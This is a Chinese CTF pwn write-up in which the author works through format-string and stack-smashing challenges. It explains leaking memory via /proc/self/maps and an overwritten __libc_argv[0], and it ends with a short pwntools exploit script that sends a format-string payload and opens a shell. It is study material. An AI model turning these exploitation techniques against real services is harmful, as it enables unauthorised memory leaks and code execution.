伪代码在这，一眼就看出有个格式化字符串漏洞。重点还是前面一次除了flag的任意读取。

应该想到，远程主机的文件结构和普通主机应该大体上是一样的。当时我猜到的是肯定有一个pwn文件，所以我查看pwn然后再利用漏洞计算出了偏移，偏移是26。但是到这里我就不知道该干啥了。

linux文件结构不是很了解，附上wp

  1. 读取除了flag的任意⽂件
  2. ⼀次格式化字符串漏洞
  3. ⽂件打开后使⽤了fclose函数
  4. 32位程序 libc：2.23

然后读取了一个/proc/self/maps，有时间去看一看/proc这个目录，它很神奇。在我们读取的目录下，可以知道libc文件的版本，从而知道system函数的基址，同样的可以知道/bin/sh，通过伪造IO_FILE拿到shell。

常规的保护措施，继续看看源码。结果，函数巨多，看傻了。

这种时候就要搜索字符串，看了一下flag的引用，到了一个函数，重命名一下，为door

第一个函数进去看一下。—-好复杂不想看了，但是有系统调用啥的，而且一下就看到了

所以就是open函数，后面那个同理是read函数。那么再来看一下这个函数。

__int64 door()
{
  unsigned int v0; // ST0C_4

  v0 = open((__int64)"./flag", 0LL);
  return read(v0, (__int64)&buffer);
}

读出flag然后存到bss段。如果可以write出来就好了。所以我们现在需要的是内存泄露的方法。

继续查找到main函数的代码，但是太难分析了。。。

对照着wp修改了一下函数名字（直接看别人的分析）然后继续。。。

大概对一些函数直接省去了读代码的步骤，归纳了一些功能。

可以看到这题没有canary，但是手动实现了一个canary，最开始的字符，和最后的异或比较，如果不匹配就会跳转。查看一下跳转的函数。

可以分析一下这个伪canary的异常处理和真canary的异常处理。

void __attribute__ ((noreturn)) __stack_chk_fail (void)
{
  __fortify_fail ("stack smashing detected");
}

void __attribute__ ((noreturn)) internal_function __fortify_fail (const char *msg)
{
  /* The loop is added only to keep gcc happy.  */
  while (1)
    __libc_message (2, "*** %s ***: %s terminated\n",
		    msg, __libc_argv[0] ?: "<unknown>");
}

smash的原理是覆盖__libc_argv[0]然后就可以泄露内存，注意这个判断，如果存在就是它，不存在就是unknow，所以对比到假的canary，就有了，v16就是覆盖对象，也就是qword_6CE3C0。

那么来了我确实有点傻这里怎么写其实无所谓，还是要去看smash是个什么东西，canary实现的原理，才能懂这个argv[0]是啥？

回到函数main函数存在溢出，猜flag那个判断Gets()函数有溢出，那么我们利用这个溢出，改写参数。

这里说一下**argv[0]**这个东西。

这个东西是一个指向程序的指针，所以说，在程序加载的时候他就出现了，指向我们运行的那个程序。

看这里，在Gets的地方下一个断点，然后输入AAA,发现了偏移就在这里，0x1c8。就可以写exp了

然而并没有发现什么惊奇的地方，好像一切都规范使用，那么，果然还是我菜，稍微长得丑一点就看不出来了。

那么大一个格式化字符串漏洞在那里== print(unk_6CCBB0)前面还有个read读入的操作。注意输入的地方！！！

测试一下。

没事了，就是输入的限制，那么我们大概有了思路。泄露rand然后输入就行了。

官方解

这题的官方解看起来很有意思，就好像，这才是非预期一样，可以学习一下。

#coding=utf-8
from pwn import *
context.arch = "amd64"
menu=""
lib = 0
elf =ELF('t1')
""" """
l64 = lambda :u64(sh.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
l32 = lambda :u32(sh.recvuntil("\xf7")[-4:].ljust(4,"\x00"))
leak = lambda name,data : sh.success(name + ": 0x%x" % data)
s = lambda payload: sh.send(payload)
sa = lambda a,b :sh.sendafter(str(a),str(b))
sl = lambda payload: sh.sendline(payload)
sla = lambda a,b :sh.sendlineafter(str(a),str(b))
ru = lambda a :sh.recvuntil(str(a))
r = lambda a :sh.recv(str(a))
""" """
def b(addr):
    # bk="b *$rebase("+str(addr)+")"
    bk="b *"+str(addr)
    attach(sh,bk)
    success("attach")
sh = process("./t1")
sh = remote(ip,port)
sa("tell me your name:","%*8$p%7$n")
sla("lucky number:","-")
sh.interactive()

学习的有两个点

  • 第一个是scanf传入‘-‘不会改变值
  • 第二个是，这个格式化字符串用的就很骚气。
  • 然后就是格式化字符串输入那里，*应该是占位符，没什么特殊意义。
